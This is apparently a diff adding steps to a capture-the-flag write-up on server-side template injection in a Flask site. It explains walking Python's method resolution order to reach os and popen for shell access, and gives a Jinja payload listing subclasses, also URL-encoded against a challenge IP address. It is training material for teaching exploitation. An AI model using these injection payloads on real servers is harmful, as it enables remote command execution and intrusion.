@@ -28,4 +28,29 @@ Can you exploit this simple mistake?
 ![image](https://user-images.githubusercontent.com/70703371/208018797-a54a741f-083b-4351-b5e9-de3141b2c9c1.png)
 
 
-6. 
+6. Now we proved that the server is running on flask, to exploit the website, we can make use of MRO (Method Resolution Order).
+
+> NOTES
+
+```
+MRO is used to traverse up the request library in flask to import os library.
+Once the attacker have access to the os library then "they" can execute any command and it will be rendered to the attacker.
+
+Have access to os library == have the shell access.
+```
+
+7. To have access to os library, we need to find the index of a special class in python which has a function called `popen`.
+8. Here's how to find it.
+
+> THE COMMAND
+
+```py
+{{"".__class__.mro__[1].__subclasses__()}}
+```
+
+> ENCODED
+
+```sh
+165.232.32.50:31397/%7B%7B%22%22.__class__.mro__%5B1%5D.__subclasses__()%7D%7D
+```
+
